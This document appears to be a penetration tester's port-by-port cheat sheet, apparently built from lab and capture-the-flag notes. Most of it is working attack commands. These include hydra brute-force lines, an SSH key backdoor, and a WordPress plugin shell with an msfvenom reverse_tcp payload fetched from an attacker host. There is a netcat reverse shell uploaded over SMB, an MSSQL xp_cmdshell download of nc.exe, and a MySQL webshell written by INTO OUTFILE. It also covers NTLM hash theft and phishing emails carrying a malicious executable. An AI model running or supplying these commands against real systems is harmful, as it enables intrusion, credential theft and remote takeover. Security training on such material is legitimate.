### Basic Fingerprint / Banner Grabbing:
- `nc -v 192.168.1.1 25`
- `telnet 192.168.1.1 25`
- `bash -c "exec 3<>/dev/tcp/192.168.11.13/22; echo EOF>&3; cat<&3"`
- Test Connectivity:  `echo '' > /dev/tcp/192.168.11.13/22`

## 21 - FTP:
- Try anonymous:  `ftp <ip>; USER anonymous; PASS anonymous`
- Brute Force:  `hydra -V -f -L <USERS_LIST> -P <PASSWORDS_LIST> ftp://<IP> -u -vV`
- Download file (binary):  `PASSIVE; BINARY; get <file>`
    - Recursively:  `wget -m ftp://anonymous:anonymous@10.10.10.98`
- Upload file (binary) (ex. webshell to access in browser):  `PASSIVE; BINARY; put <file>`
## 22 - SSH:
- Brute Force:  `hydra -V -f -L <USERS_LIST> -P <PASSWORDS_LIST> ssh://<IP> -u -vV`
- Add Backdoor (post-exploitation):
    - Attack Box:  `ssh-keygen -f <FILENAME>; chmod 600 <FILENAME>; cat <FILENAME>.pub` (copy contents)
    - Victim Box:  create <FILENAME>.pub, then: `echo <FILENAME>.pub >> <PATH>/.ssh/authorized_keys`
    - Connect:  `ssh -i <FILENAME> <USER>@<IP>`
- CVE2008-0166:  All SSL and SSH keys generated on Debian-based systems (Ubuntu, Kubuntu, etc) between September 2006 and May 13th, 2008 may be affected.
- Fixing Key Exchange/Type Errors:  `ssh -oKexAlgorithms=+diffie-hellman-group-exchange-sha1 -oHostKeyAlgorithms=+ssh-rsa user@ip`
## 25 - SMTP:
- Verify a user/email:  nc -nv 10.11.1.217 25;  VRFY root
- If you just have email addresses (maybe from cewl) and smtp port is open, try sending emails and getting response like in HTB sneakymailer (phishing, set up listener on 80):
        `while read mail; do swaks –to $mail –from it@sneakymailer.htb –header “Subject: Credentials / Errors” –body “goto http://10.10.14.4/” –server 10.10.10.197; done < mails.txt`
- For logging in and sending an email via 25, see pwk 10.11.1.229 example
- Check port 4555 remote admin tool; root/root default; change user password, then login on 110 and check
- Send email via specified SMTP server (phishing) w/ attachment:
      `mail --subject "My Issue" --exec "set sendmail=smtp://192.168.167.159:25;notls" --exec 'set verbose' -A /path/to/malicious.exe $to <<<"Hello, I have an issue: http://192.168.49.121/foo.html" bob@internal.com`
## 53 - DNS:
- IP Lookup:  `dig a domain-name-here.com @nameserver`
- MX Record Lookup:  `dig mx domain-name-here.com @nameserver`
- Recon:  `dnsenum <DOMAIN>  \\  dnsrecon -d <DOMAIN>`
- Zone Transfer:  `dnsrecon -d <DOMAIN> -a  \\  dig axfr blah.com @ns1.blah.com  \\  host -l megacorpone.com ns1.megacorpone.com  \\  Windows:  nslookup -> set type=any -> ls -d blah.com`
## 79 - Finger:
- User Enumeration:  finger @<IP>  \\  finger <USER>@<IP>
    - Script:  https://pentestmonkey.net/tools/user-enumeration/finger-user-enum with /usr/share/metasploit-framework/data/wordlists/unix_users.txt
- Command Execution:  finger "|/bin/id@<IP>"  \\  finger "|/bin/ls -a /<IP>"
## 80/443 - HTTP/HTTPS:
- **Scanners:**
    - General:  `nikto -h <IP>`
        - Edit /etc/nikto.conf to:  `USERAGENT=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36`
    - Directories:
        - Wordlists:
            - https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/directory-list-2.3-small.txt
            - https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/directory-list-2.3-medium.txt
            - https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/directory-list-2.3-big.txt
        - Basic: `gobuster dir -e -u http://192.168.235.132/ -w /usr/share/wordlists/dirb/common.txt`
        - `gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.11.1.117 -k -x txt,php -t 50`
            - Other extensions: `bak,js,doc,html,asp,aspx,zip,pl,sh,json,py,cfm,rb,cgi`
            - Other wordlists:  `/usr/share/seclists/Discovery/Web_Content/common.txt ; /usr/share/wordlists/dirb/big.txt ; /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt`
        - Or:  `dirb http://10.10.10.58:3000 -a "Custom Agent"`
        - Or:  `ffuf -u https://codingo.io/FUZZ -w ./wordlist.txt -recursion -e .txt,.php,.bak,.html`
    - Subdomains:  `ffuf -c -w /usr/share/dnsrecon/subdomains-top1mil-5000.txt -u http://example.com -H "Host: FUZZ.example.com" [-fw 5338]`
- **Wordpress:**  `wpscan --url http://10.10.10.37 -e ap --plugins-detection aggressive --enumerate u --api-token <token>`
    
            WP: After access to admin panel, enumerate: Tools > Site Health
                Install plugin reverse shell: sudo apt install seclists,  cd /usr/share/seclists/Web-Shells/WordPress, sudo zip plugin-shell.zip plugin-shell.php
                Upload and install on WP plugins page
                Or just upload direct shell plugin like at:  https://www.sevenlayers.com/index.php/179-wordpress-plugin-reverse-shell
                Send commands:   curl http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=whoami
                Generate and transfer shell payload:  msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.11.0.4 LPORT=443 -f elf > shell.elf
                     curl http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=wget%20http://10.11.0.4/shell.elf
                     curl http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=chmod%20%2bx%20shell.elf
                    sudo msfconsole -q -x "use exploit/multi/handler;\
                    > set PAYLOAD linux/x86/meterpreter/reverse_tcp;\
                    > set LHOST 10.11.0.4;\
                    > set LPORT 443;\
                    > run"
                     curl http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=./shell.elf
            RCE:
                Modifying a php from the theme used (admin credentials needed)
                Appearance -> Editor -> 404 Template (at the right)
                Change the content for a php shell
                https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php
                http://<IP>/wp-content/themes/twentytwelve/404.php

- **Exploit Techniques:**
See Web Exploitation Page

## 88 - Kerberos:
- https://www.tarlogic.com/en/blog/how-to-attack-kerberos/
- See Active Directory Exploitation Notes

    //Kerberos Bruteforce Usernames:
        kerbrute userenum -d EGOTISTICAL-BANK.LOCAL /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc 10.10.10.175
    //ASREP Roast:  GetNPUsers.py 'EGOTISTICAL-BANK.LOCAL/' -usersfile users.txt -format hashcat -outputfile hashes.aspreroast -dc-ip 10.10.10.175

## 110 - POP3:
- Brute Force:  `hydra -l <USER> -P <PASSWORDS_LIST> -f <IP> pop3 -V  \\  hydra -S -v -l <USER> -P <PASSWORDS_LIST> -s 995 -f <IP> pop3 -V`
- Read Mail (w/ creds):  `telnet 10.10.10.17 110; USER bob; PASS password123; LIST; RETR <mail #>; QUIT`
- Other commands: http://sunnyoasis.com/services/emailviatelnet.html
## 139/445 - SMB:
    //Test Creds:  crackmapexec smb 10.10.10.52 -u james -p 'J@m3s_P@ssW0rd!'
    //Connect:
        //anon:  smbclient -N -L //10.10.10.103
            //specific share:  smbclient -N //10.10.10.103/SYSVOL
        smbclient //192.168.189.75/C$ -U prod.corp1.com/Offsec%lab
        smbclient --user r.thompson //10.10.10.182/data rY4n5eva
        //recursively list:  smbmap -H 10.10.10.100 -R
            //creds:  smbmap -H 10.10.10.100 -d <domain> -u <username> -p <pass>
        //download all: mask ""; recurse ON; prompt OFF; mget *
    //Mount share locally:  mount -t cifs [username=user,password=abc123] "//10.10.10.103/Department Shares" /mnt
    //RPC:
        rpcclient -U "" -N 10.10.10.161
            querydispinfo
            enumdomusers
            enumdomgroups
            ex. querygroup 0x200; querygroupmem 0x200; queryuser 0x1f4

- Scan Subnet for Shares:  `nbtscan 192.168.1.0/24`
- Check for Vulns (could crash):  `nmap -script smb-vuln* -script-args=unsafe=1 -p139,445 <IP>`
- Sniff version:  `sudo ngrep -i -d <interface> 's.?a.?m.?b.?a*[[:digit:]]' port 139  ;  smbclient -L <IP>  \\  Or MSF:  use auxiliary/scanner/smb/smb_version`
- View Shares:  `smbmap -H <IP>  \\  smbclient -L <IP>`
- Enumerate:  `enum4linux [-a] <IP>` ; - `nmblookup -A <target>`
    - Users:  `python /usr/share/doc/python-impacket-doc/examples/samrdump.py 192.168.XXX.XXX`
- Brute Force:  `hydra -V -f -L <USERS_LIST> -P <PASSWORDS_LIST> smb://<IP> -u -vV`
- Connect:  `Anonymous: smbclient //$ip/share -N  \\  smbclient \\\\$ip\\$share [-U <user>]  \\  smbclient -L <IP> -U administrator  (or anonymous)`
    - Commands:  `help, get, put, etc.`
- Null session with rpcclient (MS-RPC) for legacy samba or SMB:  `rpcclient -U "" [target IP address]  ;  enumdomusers`
- Exploitation Example:
    
        Connect, Upload and get shell via web:    
        (1: initial, unstable shell): msfvenom -p php/reverse_php LHOST=10.10.14.18 LPORT=4444 -o rev.php
        smbclient -U 'tyler%92g!mA8BGjOirkL%OG*&' //10.10.10.97/new-site -c 'put rev.php' -> Visit in browser     
        (2: switch to stable shell w/ nc)
        smbclient -U 'tyler%92g!mA8BGjOirkL%OG*&' //10.10.10.97/new-site -c 'put /usr/share/windows-resources/binaries/nc.exe nc.exe'
        ##smbclient -U 'tyler%92g!mA8BGjOirkL%OG*&' //10.10.10.97/new-site -c 'put /home/user/simplephpwebshell.php cmd.php'
        In first shell: nc.exe 10.10.14.18 4445 -e cmd.exe

## 161 - SNMP:
- Enumerate:
        nmap -sV -p 161 --script=snmp-info <TARGET-SUBNET>
        snmpwalk -c public -v 1 10.10.10.116
        snmpwalk -v3 -l authNoPriv -u authOnlyUser -a MD5 -A MyPassword123 192.168.1.2
        snmp-check 192.168.1.2 -c public
        Script:  https://github.com/dheiland-r7/snmp:  `perl snmpbw.pl 10.10.10.241 public 2 4`
        SNMP v1/v2 wordlist:  /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt
        Users:  snmpwalk public -v1 192.168.X.XXX 1 |grep 77.1.2.25 |cut -d” “ -f4  \\  python /usr/share/doc/python-impacket-doc/examples/samrdump.py SNMP 192.168.X.XXX
- Probe with snmpwalk if we know the community string (often is 'public'):
    - mib tree:   `snmpwalk -c public -v1 -t 10 10.11.1.14`
    - windows users:   `snmpwalk -c public -v1 10.11.1.14 1.3.6.1.4.1.77.1.2.25`
    - running windows processes:  `snmpwalk -c public -v1 10.11.1.73 1.3.6.1.2.1.25.4.2.1.2`
    - installed software:   `snmpwalk -c public -v1 10.11.1.50 1.3.6.1.2.1.25.6.3.1.2`
- Brute Force Community String:  `onesixtyone -c /usr/share/wordlists/SecLists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt <IP>`
## 389 - LDAP:
    //Ldap:
        ldapsearch -x -h 10.10.10.175 -s base namingcontexts
            ldapsearch -x -h 10.10.10.175 -b 'DC=EGOTISTICAL-BANK,DC=LOCAL'
        ldapdomaindump -u 'htb.local\amanda' -p Ashare1972 10.10.10.103 -o ~/hackthebox/sizzle-10.10.10.103/ldap/
- Run Scans:  `nmap -n -sV --script "ldap* and not brute" <IP>`
- `ldapsearch -h <IP> -x -s base`
- `ldapsearch -h <IP> -x -D '<DOMAIN>\<USER>' -w '<PASSWORD>' -b "DC=<1_SUBDOMAIN>,DC=<TDL>"`
- GUI:  jxplorer
## 1433 - MSSQL:
- Scan:  `nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <IP>`
- Brute Force:  `hydra -L <USERS_LIST> -P <PASSWORDS_LIST> <IP> mssql -vV -I -u`  OR:  `msf > use auxiliary/admin/mssql/mssql_enum`
- With Creds:
    
        mssqlclient.py -windows-auth <DOMAIN>/<USER>:<PASSWORD>@<IP>
        mssqlclient.py <USER>:<PASSWORD>@<IP>
        # Once logged in you can run queries:
        SQL> select @@ version;
        # Steal NTLM hash
        sudo smbserver.py -smb2support liodeus .
        SQL> exec master..xp_dirtree '\\<IP>\liodeus\' # Steal the NTLM hash, crack it with john or hashcat
        # Try to enable code execution
        SQL> enable_xp_cmdshell
        # Execute code
        SQL> xp_cmdshell whoami /all
        SQL> xp_cmdshell certutil.exe -urlcache -split -f http://<IP>/nc.exe
- Metasploit MSSQL Shell:
    
        msf > use exploit/windows/mssql/mssql_payload
        msf exploit(mssql_payload) > set PAYLOAD windows/meterpreter/reverse_tcp
    
## 2049 - NFS:
- View Shares:  `showmount -e <IP>`
- Mount Share Locally:  `sudo mount -v -t nfs <IP>:<SHARE> <DIRECTORY>`
- View Exported Shares:  `cat /etc/exports`
- Privesc: look for no_root_squash/no_all_squash
## 3306 - MYSQL:
- Brute Force:  `hydra -L <USERS_LIST> -P <PASSWORDS_LIST> <IP> mysql -vV -I -u`
- Local Connect:  `mysql -u <user> -p <password> [-e 'show databases;'  \\  -e 'use drupal; show tables; select * from users;']`
    - IF MYSQL LOCAL LOGIN DOESN'T WORK, USE MYSQLDUMP (or look for other mysql programs on box) (or use tool like Chisel):
        - `mysqldump --user=theseus --password=iamkingtheseus --host=localhost Magic`
    - ex. Setup local mysql database to connect to w/ adminer:  https://0xdf.gitlab.io/2020/09/26/htb-admirer.html
- Remote Connect:  `mysql -h <IP> -u <USER>`
- Commands:
    
        show databases;
        use <DATABASES>;
        show tables;
        describe <TABLE>;
        select * from <TABLE>;
        # Try to execute code
        select do_system('id');
        \! sh
        # Read & Write
        select load_file('<FILE>');
        select 1,2,"<?php echo shell_exec($_GET['c']);?>",4 into OUTFILE '<OUT_FILE>'
    
## 3389 - RDP:
- Regular login:   `rdesktop [-d <DOMAIN>] -u <USERNAME> [-p <PASS>] <IP>  \\  xfreerdp /u:[DOMAIN\]<USERNAME> /p:<PASSWORD> /v:<IP> /cert-ignore +clipboard`
    - Ignore TLS errors:  xfreerdp +nego +sec-rdp +sec-tls +sec-nla /v:192.168.138.120 /u:administrator /p:password /size:1600x900 /tls-seclevel:0
- PTH:  `xfreerdp /u:[DOMAIN\]<USERNAME> /pth:<HASH> /v:<IP>`
- Brute Force:  `crowbar -b rdp -s <IP>/CIDR [-u <USER>  \\  -U <USERLIST>] -C <PASSWORDS_LIST>  \\  hydra -f -L <USERS_LIST> -P <PASSWORDS_LIST> rdp://<IP> -u -vV`
- Add RDP User:  `net user <user> <pass> /add; net localgroup "Administrators" <USER> /add; net localgroup "Remote Desktop Users" <USER> /add`
## 3690 - SVN Server:
        svn info svn://10.10.10.203
        svn list svn://10.10.10.203
        svn export svn://10.10.10.203/moved.txt
        svn export svn://10.10.10.203/dimension.worker.htb/,  svn checkout -r 1 svn://worker.htb,  svn checkout -r 2 svn://worker.htb
## 5800/5900/5901/58001 - VNC:
- Scan:  `nmap -sV --script vnc-info,realvnc-auth-bypass,vnc-title -v -p <PORT> <IP>`
- Brute Force:  `hydra -L <USERS_LIST> –P <PASSWORDS_LIST> -s <PORT> <IP> vnc -u -vV`
- Connect:  `vncviewer <IP>:<PORT>`
- Default Password Locations:
    - Linux: ~/.vnc/passwd
    - Windows:
    
            # RealVNC:  HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\vncserver
            # TightVNC:  HKEY_CURRENT_USER\Software\TightVNC\Server
            # TigerVNC:  HKEY_LOCAL_USER\Software\TigerVNC\WinVNC4
            # UltraVNC:  C:\Program Files\UltraVNC\ultravnc.ini
## 5985/5986 - WINRM:
- Brute Force:  `crackmapexec winrm <IP> -u <USERS_LIST> -p <PASSWORDS_LIST>`
- Connect:  `evil-winrm -i <IP> -u <USER> -p <PASSWORD>  \\  evil-winrm -i <IP> -u <USER> -H <HASH>`


    
    
